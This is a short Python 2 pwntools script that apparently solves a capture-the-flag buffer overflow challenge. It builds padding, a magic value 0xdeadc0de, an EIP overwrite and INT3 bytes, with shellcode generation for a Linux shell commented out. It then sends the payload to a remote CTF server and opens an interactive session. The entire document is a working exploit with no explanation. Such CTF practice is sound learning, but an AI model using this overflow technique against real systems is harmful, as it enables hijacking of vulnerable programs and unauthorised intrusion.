#!/usr/bin/env python

#Run in python 2!
from pwn import *
important=0xdeadc0de
payload = ''
def identifier(l=26):
    output = ""
    for i in range(65,65+l):
        output+=chr(i)*4
    return output

padding = identifier()+identifier(10-4)

eip = "\xe8\xcd\xff\xff"
command = "\xCC\xCC\xCC\xCC"

padding = identifier()+identifier(10-4)
payload = padding +"\xde\xc0\xad\xde"+identifier(1)+eip+command
#shellcode =  asm(shellcraft.i386.linux.sh())

print(payload)
with open("shell.in","w") as f:
    f.write(payload)

# Solve
conn = remote('challenges.csdc20t.ctf.sg',10013)
# Main menu
print(conn.recvuntil("=>"))
conn.send(payload+"\n")
conn.interactive()
